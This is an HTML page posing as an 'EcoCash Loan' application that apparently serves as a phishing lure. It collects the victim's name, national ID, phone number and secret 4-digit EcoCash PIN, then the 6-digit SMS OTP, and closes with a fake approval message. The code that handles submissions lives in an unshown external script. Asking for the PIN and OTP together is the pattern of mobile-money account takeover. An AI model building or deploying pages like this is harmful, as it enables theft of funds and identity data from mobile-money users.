<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>EcoCash Loan Application</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-blue-50/50 flex items-center justify-center min-h-screen p-4">

  <div class="bg-white rounded-2xl shadow-xl border border-blue-100 w-full max-w-lg p-6 sm:p-8">
    
    <!-- HEADER -->
    <div class="text-center mb-6">
      <h1 class="text-3xl font-extrabold text-blue-600 tracking-tight">EcoCash Loan</h1>
      <p class="text-sm text-blue-500 font-medium mt-1">Fast & Secure Mobile Loans</p>
    </div>

    <!-- HORIZONTAL STEP INDICATOR -->
    <div id="step-indicator" class="flex items-center justify-between mb-8 px-4">
      <!-- Step 1 Badge -->
      <div id="step-node-1" class="flex flex-col items-center">
        <div id="step-circle-1" class="w-10 h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md">
          1
        </div>
        <span id="step-label-1" class="text-xs font-semibold text-blue-600 mt-2">Application</span>
      </div>

      <!-- Connector Line -->
      <div id="step-line-1" class="flex-1 h-1 bg-gray-200 mx-2 rounded transition-colors duration-300"></div>

      <!-- Step 2 Badge -->
      <div id="step-node-2" class="flex flex-col items-center">
        <div id="step-circle-2" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 font-bold flex items-center justify-center">
          2
        </div>
        <span id="step-label-2" class="text-xs font-medium text-gray-400 mt-2">6-Digit OTP</span>
      </div>
    </div>

    <!-- STEP 1: APPLICANT DETAILS & ECOCASH CREDENTIALS -->
    <form id="step1-form" class="space-y-4">
      
      <!-- Full Name -->
      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">Full Name</label>
        <input type="text" id="fullName" required placeholder="John Doe"
               class="w-full border border-blue-200 rounded-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base">
      </div>

      <!-- National ID / Passport Number -->
      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">National ID / Passport Number</label>
        <input type="text" id="idNumber" required placeholder="63-1234567A89"
               class="w-full border border-blue-200 rounded-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base">
      </div>

      <!-- Requested Loan Amount -->
      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">Loan Amount ($)</label>
        <input type="number" id="loanAmount" required min="10" max="1000" placeholder="100"
               class="w-full border border-blue-200 rounded-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base">
      </div>

      <!-- Mobile Phone Number -->
      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">EcoCash Registered Phone Number</label>
        <div class="flex">
          <span class="inline-flex items-center px-3.5 rounded-l-lg border border-r-0 border-blue-200 bg-blue-50 text-blue-700 text-sm font-semibold">+263</span>
          <input type="tel" id="phone" required placeholder="771234567" maxlength="9" 
                 class="w-full border border-blue-200 rounded-r-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base">
        </div>
      </div>

      <!-- 4-Digit PIN -->
      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">4-Digit EcoCash PIN</label>
        <input type="password" id="pin" required maxlength="4" pattern="\d{4}" placeholder="••••"
               class="w-full border border-blue-200 rounded-lg p-3 text-center text-gray-800 text-2xl font-bold tracking-widest focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
      </div>

      <button type="submit" id="btn-step1" 
              class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-lg shadow-md hover:shadow-lg transition duration-200 mt-2">
        Proceed to Verification
      </button>
    </form>

    <!-- STEP 2: 6-DIGIT OTP FORM (Hidden Initially) -->
    <form id="step2-form" class="space-y-5 hidden">
      <div id="otp-status-banner" class="bg-blue-50 border border-blue-200 rounded-lg p-3.5 text-center">
        <p id="otp-status-text" class="text-xs text-blue-700 font-medium">An SMS with a 6-digit verification code has been sent to your mobile line.</p>
      </div>

      <div>
        <label class="block text-sm font-semibold text-gray-700 text-center mb-1">Enter 6-Digit OTP</label>
        <input type="text" id="otp" required maxlength="6" pattern="\d{6}" placeholder="123456"
               class="w-full border border-blue-200 rounded-lg p-3.5 text-center text-3xl font-extrabold tracking-widest text-blue-900 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
      </div>

      <button type="submit" id="btn-step2" 
              class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-lg shadow-md hover:shadow-lg transition duration-200">
        Submit OTP
      </button>
    </form>

    <!-- SUCCESS SCREEN -->
    <div id="success-screen" class="hidden text-center py-6">
      <div class="w-16 h-16 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl font-bold">
        ✓
      </div>
      <h2 class="text-2xl font-bold text-gray-800">Application Approved!</h2>
      <p class="text-sm text-gray-600 mt-2">Your 6-digit OTP has been verified. You will receive an SMS confirmation with loan disbursement details shortly.</p>
    </div>

  </div>

  <script src="/app.js"></script>
</body>
  </html>
